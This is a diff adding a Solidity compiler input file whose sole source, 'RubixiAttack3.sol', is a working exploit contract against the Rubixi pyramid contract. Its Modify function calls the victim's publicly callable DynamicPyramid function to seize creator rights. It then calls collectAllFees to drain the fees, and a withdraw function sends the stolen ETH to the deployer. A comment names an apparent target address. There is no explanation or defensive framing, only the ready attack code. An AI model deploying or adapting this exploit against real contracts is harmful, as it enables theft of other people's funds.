@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "contracts/Rubixi/RubixiAttack3.sol": {
+      "content": "//SPDX-License-Identifier: private\npragma solidity ^0.6.6;\n\ninterface Rubixi {\n\n        //Fee functions for creator\n        function collectAllFees() external ;\n\n        //Functions for changing variables related to the contract\n        function changeOwner(address _owner) external ;\n        \n        function DynamicPyramid() external;\n}\n\n//0xf6f3349A76B6fC74d84D11E596Dd44a60b18a64E\ncontract RubixiAction{\n    address payable public owner;\n        \n    constructor() public {\n        owner = payable(msg.sender);\n    }\n        \n    modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n    \n    function Modify(address _victim) external {\n        Rubixi(_victim).DynamicPyramid();\n        Rubixi(_victim).collectAllFees();\n    }\n    \n        /// @return contract balance\n    function contractBalance() external view returns (uint) {\n        return address(this).balance;\n    }\n    \n     /// withdraw balance to owner\n    function withdraw() external onlyOwner {\n        owner.transfer(address(this).balance);\n     }\n    \n    \n    fallback( ) external payable { }\n    receive ( ) external payable { }\n}\n    "
+    }
+  }
+}
